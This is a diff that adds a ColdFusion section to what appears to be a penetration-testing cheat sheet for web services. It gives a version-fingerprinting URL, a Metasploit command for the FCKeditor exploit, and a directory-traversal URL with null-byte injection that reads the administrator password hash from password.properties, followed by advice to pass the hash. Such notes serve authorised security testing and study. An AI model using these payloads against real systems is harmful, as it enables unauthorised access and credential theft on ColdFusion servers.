@@ -6,6 +6,39 @@ This is a list of some common web-services. The list is alphabetical.
 
 http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
 
+### Determine version
+
+example.com/CFIDE/adminapi/base.cfc?wsdl
+It will say something like:
+```
+<!--WSDL created by ColdFusion version 8,0,0,176276-->
+```
+
+### Version 8
+
+#### FCKEDITOR
+
+
+This works for version 8.0.1. So make sure to check the exact version.
+```
+use exploit/windows/http/coldfusion_fckeditor
+```
+
+#### LFI
+
+This will output the hash of the password. 
+```
+http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+```
+
+You can pass the hash.
+
+http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
+
+http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
+
+neo-security.xml and password.properties
+
 ## Drupal
 
 ## Joomla
